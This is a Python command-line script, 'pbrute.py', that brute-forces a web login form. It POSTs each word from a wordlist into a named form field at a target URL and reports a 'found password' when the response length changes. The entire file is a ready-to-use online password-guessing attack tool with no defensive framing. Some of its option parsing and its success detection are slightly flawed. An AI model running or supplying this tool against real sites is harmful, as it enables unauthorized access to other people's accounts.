import sys, getopt # For argv
import requests # For GET / POST requests.
from requests.adapters import HTTPAdapter # For set (max_retries)
from urllib3.util.retry import Retry # Get Retry() to setting count of connections.
import logging

# Create list for responses of each attempt on url.
respLengthElem = []

# Remove first argument from the list
argList = sys.argv[ 1: ]

# Options
options = "hwuk:"

# Long options
long_options = [ "help", "wordlist=", "url=", "key=" ]

str_arg_help = """
Usage: python pbrute.py [--w=wordlist_file] [--u=url] [--k=name_html_attribute]

Options:
    --w=wordlist_file, --wordlist=wordlist_file       Type the name of file
                                                      with random words in order to
                                                      search for matching pattern.


    --u=url, --url=url                                Type the target url.


    --k=name_html_attribute, --key=name_html_attrib   Pass html name attribute
                                                      of field in forms 
                                                      which you want
                                                      to brute.

"""


def main():

    wordlist=None
    url=None
    key=None
    shownHelp = False

    try:
        # Parsing argument
        args, vals = getopt.getopt( argList, options, long_options )
        for currArg, currVal in args:
            if currArg in ( "-h", "--help" ):
               print( str_arg_help )
               shownHelp = True
               break
            if currArg in ( "-w", "--wordlist" ):
                wordlist = currVal
            elif currArg in ( "-u", "--url" ):
                url = currVal
            elif currArg in ( "-k", "--key" ):
                key = currVal
            
    except getopt.error as err:
            # output error, return also an error code
            print( str( err ) )

    try:
        if shownHelp is True: pass
        elif wordlist is None or url is None or key is None:
            print( str_arg_help )
        else:
            # Open wordlist file with ignoring errors and encoding on utf-8 standard
            with open( wordlist, encoding="utf-8", errors='ignore' ) as f:
                for line in f:
                    # Remove \n in the end of line
                    stripped = line.rstrip()
                    # Open it as session in order to sending request for each session
                    with requests.Session() as s:
                        # Increase count of max_retries on single http/https url.
                        retry = Retry( connect=3, backoff_factor=0.5 )
                        adapter = HTTPAdapter(max_retries=retry)
                        s.mount( 'http://', adapter )
                        s.mount( 'https://', adapter )
                        try:
                            # Send request by post method within sending key, value for html form
                            r = s.post( url, data={ key : stripped } )
                            # Take length of each response as text
                            response_length = len( r.text )
                            # Add responses to list
                            respLengthElem.append( response_length )
                            
                            # Compare length of responses to each other in list.
                            for i in range( len( respLengthElem ) - 1 ):
                                # If some response length is not equal length of another, return
                                if respLengthElem[i] != respLengthElem[i+1]:
                                    print( "Found password is:",stripped )
                                    return
                        except requests.exceptions.ConnectionError:
                            logging.error( "Please, check the URL, Connection with this URL cannot be estabilished!" )
                            break
    except FileNotFoundError:
        logging.error( f"file {wordlist!r} not found!" )

     
if __name__ == '__main__':
    main()
    
